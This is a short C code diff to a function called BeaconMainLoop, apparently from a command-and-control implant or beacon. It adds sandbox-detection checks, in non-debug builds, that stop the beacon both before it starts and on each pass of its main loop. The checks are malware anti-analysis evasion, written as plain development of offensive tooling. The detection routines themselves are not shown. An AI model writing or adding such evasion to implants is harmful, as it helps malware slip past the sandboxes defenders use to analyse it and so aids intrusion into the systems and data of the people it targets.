@@ -407,6 +407,11 @@ VOID BeaconMainLoop
 		goto CLEANUP;
 	}
 
+#ifndef _DEBUG
+	if (DetectSandbox2() || DetectSandbox3()) {
+		goto CLEANUP;
+	}
+#endif
 	if (!pBeacon->Start(pBeacon->pGlobalConfig, pBeacon->lpClient)) {
 		goto CLEANUP;
 	}
@@ -421,6 +426,12 @@ VOID BeaconMainLoop
 	}
 
 	while (TRUE) {
+#ifndef _DEBUG
+		if (DetectSandbox1() || DetectSandbox2()) {
+			goto CLEANUP;
+		}
+#endif
+
 		if (dwNumberOfAttempts >= pBeacon->pGlobalConfig->dwMaxFailure) {
 			break;
 		}
